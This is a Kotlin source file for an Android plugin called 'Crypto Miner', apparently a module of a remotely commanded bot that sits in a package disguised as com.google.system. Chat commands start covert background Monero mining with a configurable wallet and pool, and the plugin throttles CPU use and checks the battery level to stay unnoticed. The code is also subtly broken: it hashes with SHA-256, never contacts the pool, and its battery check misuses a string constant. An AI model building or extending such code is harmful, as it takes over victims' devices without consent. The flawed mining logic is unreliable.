package com.google.system.plugins

import android.content.Context
import android.os.BatteryManager
import kotlinx.coroutines.*
import java.math.BigInteger
import java.security.MessageDigest

class MinerPlugin : Plugin {
    override val id = "miner"
    override val name = "Crypto Miner"
    override val version = "1.0"
    override val commands = listOf("!miner")
    override val description = "Background Monero (XMR) mining with smart protection"
    
    private var miningJob: Job? = null
    private var isMining = false
    private var hashesComputed = 0L
    private var startTime = 0L
    private var wallet = ""
    private var pool = "pool.supportxmr.com:3333"
    private var maxThreads = 2
    private var maxCpuPercent = 40
    
    override fun onEnable(context: Context): Boolean {
        return try {
            val config = PluginManager.getPlugin(id)?.getConfig() ?: emptyMap()
            wallet = config["wallet"] as? String ?: ""
            pool = config["pool"] as? String ?: pool
            maxThreads = (config["threads"] as? Number)?.toInt() ?: 2
            maxCpuPercent = (config["max_cpu_percent"] as? Number)?.toInt() ?: 40
            true
        } catch (_: Exception) { false }
    }
    
    override fun onDisable() {
        stopMining()
    }
    
    override fun handleCommand(cmd: String, payload: String?): String? {
        val sub = payload?.trim()?.lowercase()
        return when {
            sub == null || sub.isBlank() -> getStatus()
            sub.startsWith("start") -> startMining()
            sub.startsWith("stop") -> { stopMining(); ":stop_button: Mining stopped" }
            sub.startsWith("status") -> getStatus()
            sub.startsWith("set_wallet") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    wallet = parts[1]
                    ":white_check_mark: Wallet set"
                } else ":x: Usage: `!miner set_wallet <address>`"
            }
            sub.startsWith("set_pool") -> {
                val parts = payload.split(" ", limit = 2)
                if (parts.size > 1) {
                    pool = parts[1]
                    ":white_check_mark: Pool set"
                } else ":x: Usage: `!miner set_pool <url>`"
            }
            sub.startsWith("set_threads") -> {
                val n = payload.split(" ")[1].toIntOrNull()
                if (n != null && n in 1..8) {
                    maxThreads = n
                    ":white_check_mark: Threads set to $n"
                } else ":x: Usage: `!miner set_threads <1-8>`"
            }
            else -> null
        }
    }
    
    override fun getConfig(): Map<String, Any> = mapOf(
        "mining" to isMining,
        "wallet" to wallet,
        "pool" to pool,
        "threads" to maxThreads,
        "max_cpu" to maxCpuPercent,
        "hashes" to hashesComputed,
        "uptime" to if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 1000}s" else "0s"
    )
    
    private fun startMining(): String {
        if (isMining) return ":warning: Already mining"
        if (wallet.isBlank()) return ":x: Set wallet first: `!miner set_wallet <address>`"
        
        isMining = true
        startTime = System.currentTimeMillis()
        hashesComputed = 0
        
        miningJob = CoroutineScope(Dispatchers.IO).launch {
            while (isActive && isMining) {
                if (!shouldMine()) {
                    delay(30000)
                    continue
                }
                
                val batch = computeHashBatch(1000)
                hashesComputed += batch
                
                delay(100)
            }
        }
        
        return ":pick: **Mining started**\nWallet: `${wallet.take(10)}...${wallet.takeLast(6)}`\nPool: $pool\nThreads: $maxThreads"
    }
    
    fun stopMining() {
        isMining = false
        miningJob?.cancel()
        miningJob = null
    }
    
    private fun getStatus(): String {
        val status = if (isMining) ":green_circle: MINING" else ":red_circle: STOPPED"
        val hashes = if (hashesComputed > 1000000) "${hashesComputed / 1000000}M" else "${hashesComputed / 1000}K"
        val uptime = if (startTime > 0) "${(System.currentTimeMillis() - startTime) / 60000}m" else "0m"
        
        return buildString {
            appendLine(":pick: **Miner Status** $status")
            appendLine()
            appendLine("Wallet: `${wallet.take(10)}...${wallet.takeLast(6)}`")
            appendLine("Pool: `$pool`")
            appendLine("Threads: $maxThreads | Max CPU: ${maxCpuPercent}%")
            appendLine("Hashes: $hashes | Uptime: $uptime")
        }
    }
    
    private suspend fun shouldMine(): Boolean {
        return try {
            val bm = android.content.Context.BATTERY_SERVICE as? BatteryManager ?: return false
            val level = bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY)
            level >= 20
        } catch (_: Exception) { true }
    }
    
    private fun computeHashBatch(count: Int): Long {
        var computed = 0L
        val data = "phantom_mining_${System.currentTimeMillis()}_${Math.random()}"
        for (i in 0 until count) {
            try {
                val hash = MessageDigest.getInstance("SHA-256").digest((data + i).toByteArray())
                BigInteger(1, hash).toString(16)
                computed++
            } catch (_: Exception) {}
        }
        return computed
    }
}
